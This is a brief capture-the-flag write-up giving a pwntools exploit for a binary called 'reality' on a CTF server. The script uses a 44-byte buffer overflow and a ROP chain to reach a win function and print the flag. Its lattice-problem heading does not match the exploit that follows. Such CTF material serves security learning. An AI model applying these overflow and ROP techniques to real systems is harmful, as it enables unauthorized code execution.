a closest vector problem in lattice

Original writeup
(https://colab.research.google.com/github/nguyenduyhieukma/CTF-
Writeups/blob/master/Google%20CTF%20Quals/2019/reality/reality-
solution.ipynb).Here is exploit for this chal

```  
from pwn import args, ELF, process, remote, gdb, context, ROP, cyclic, re

PATH = "./reality"  
IP = 'mctf.ru'  
PORT = 28888  
elf = context.binary = ELF(PATH, checksec=False)  
GDBSCRIPT = '''b *clickit  
c  
'''

def conn():  
   if args.GDB:  
       return gdb.debug(PATH, gdbscript=GDBSCRIPT)  
   elif args.REMOTE:  
       return remote(IP, PORT)  
   elif args.LOCAL:  
       pty = process.PTY  
       return process(PATH, stdin=pty, stdout=pty)

def main():  
   r = conn()

   rop = ROP(elf)

   rop.one()  
   rop.two(322)  
   rop.three(0xdeadbeef, 0x0000ffff, 123)  
   rop.clickit()

   payload = cyclic(44)  
   payload += rop.chain()  
   r.recvline()  
   r.sendline(payload)

   # for debug purpose  
   # print(rop.dump())

   r.recvuntil(f"this? ")  
   r.sendline(b"128959393")  
   # print(r.recvall())  
   print(re.search("(MCTF{.*})", r.recvall().decode()).group(1))

if __name__ == '__main__':  
   main()  
```